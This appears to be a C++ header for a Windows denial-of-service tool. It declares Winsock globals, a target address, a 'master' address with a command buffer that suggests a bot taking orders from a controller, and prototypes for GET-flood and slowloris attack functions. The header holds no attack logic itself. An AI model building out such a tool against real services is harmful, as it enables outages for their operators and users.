#ifndef DDOS_H
#define DDOS_H
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#undef UNICODE
#include <iostream>
#include <WinSock2.h>
#include <Windows.h>
#include <thread>
#pragma comment(lib, "ws2_32.lib")
using namespace std;

#define BUFF_SIZE 10000
#define DEFAULT_PORT "27015"

WSADATA wsa;
struct hostent *host;
char command[10];
const char* url;
SOCKET sock = socket(PF_INET, SOCK_STREAM, 0);
SOCKADDR_IN target_addr;
SOCKET csock = socket(PF_INET, SOCK_STREAM, 0);
SOCKADDR_IN master_addr;

int create_socket();
int getflooding_attack();
int slowloris_attack();

#endif
